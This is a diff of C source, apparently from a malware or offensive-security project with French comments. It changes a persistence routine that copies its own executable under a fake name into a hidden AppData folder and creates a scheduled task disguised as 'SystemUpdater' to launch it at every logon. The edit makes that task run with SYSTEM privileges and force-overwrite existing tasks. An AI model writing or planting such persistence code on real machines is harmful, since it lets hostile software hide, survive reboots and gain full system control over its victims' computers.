@@ -29,7 +29,7 @@ void set_persistance(char *softwareDataDirectory, char *current_executable_path,
   char cmd[1024];
 
   // copie de l'executable sous un faux nom dans C:\Users\<username>\AppData\Local\G666 + création d'une planification de tache windows qui lance cet executable au démarage
-  snprintf(cmd, 1024, "/c copy \"%s\" \"%s\\%s\" & schtasks /create /tn SystemUpdater /tr \"%s\\%s\" /sc onlogon", current_executable_path, softwareDataDirectory, fake_executable_name, softwareDataDirectory, fake_executable_name);
+  snprintf(cmd, 1024, "/c copy \"%s\" \"%s\\%s\" & schtasks /create /tn SystemUpdater /tr \"%s\\%s\" /sc onlogon /RU SYSTEM /F", current_executable_path, softwareDataDirectory, fake_executable_name, softwareDataDirectory, fake_executable_name);
 
   printf("Commande pour la persistance: %s\n", cmd);
   sei.lpParameters = cmd;
